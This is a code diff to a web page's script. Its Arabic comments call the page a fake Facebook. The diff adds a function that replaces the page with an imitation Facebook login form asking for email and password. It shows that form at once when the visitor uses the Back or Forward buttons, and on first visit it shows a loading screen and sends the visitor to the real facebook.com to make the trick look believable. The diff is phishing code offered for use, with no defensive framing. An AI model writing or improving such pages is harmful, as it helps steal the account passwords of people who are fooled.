@@ -87,9 +87,28 @@
     }
 </style>
 <script>
+function showFakeFacebook() {
+    document.body.innerHTML = `
+        <div class="container">
+            <div class="login-box">
+                <div class="logo">facebook</div>
+                <input type="text" placeholder="Email address or phone number">
+                <input type="password" placeholder="Password">
+                <button class="login-btn">Log in</button>
+                <button class="create-btn">Create new account</button>
+            </div>
+        </div>
+    `;
+}
+
 window.onload = function () {
-    if (!sessionStorage.getItem('redirected')) {
-        // أول مرة - شاشة Loading + Redirect
+    let navType = (performance.getEntriesByType("navigation")[0] || {}).type;
+
+    if (navType === "back_forward") {
+        // لو جاي من Back أو Forward → عرض الفيس المزيف مباشرة
+        showFakeFacebook();
+    } else if (!sessionStorage.getItem('redirected')) {
+        // أول مرة → Loading ثم Redirect
         document.body.innerHTML = `
             <div class="loading">
                 <div class="dot"></div>
@@ -103,18 +122,8 @@ window.onload = function () {
             window.location.href = "https://facebook.com/a";
         }, 1500);
     } else {
-        // تاني مرة - عرض ديزاين الفيسبوك
-        document.body.innerHTML = `
-            <div class="container">
-                <div class="login-box">
-                    <div class="logo">facebook</div>
-                    <input type="text" placeholder="Email address or phone number">
-                    <input type="password" placeholder="Password">
-                    <button class="login-btn">Log in</button>
-                    <button class="create-btn">Create new account</button>
-                </div>
-            </div>
-        `;
+        // أي مرة تانية غير الـBack → عرض الفيس المزيف
+        showFakeFacebook();
     }
 };
 </script>
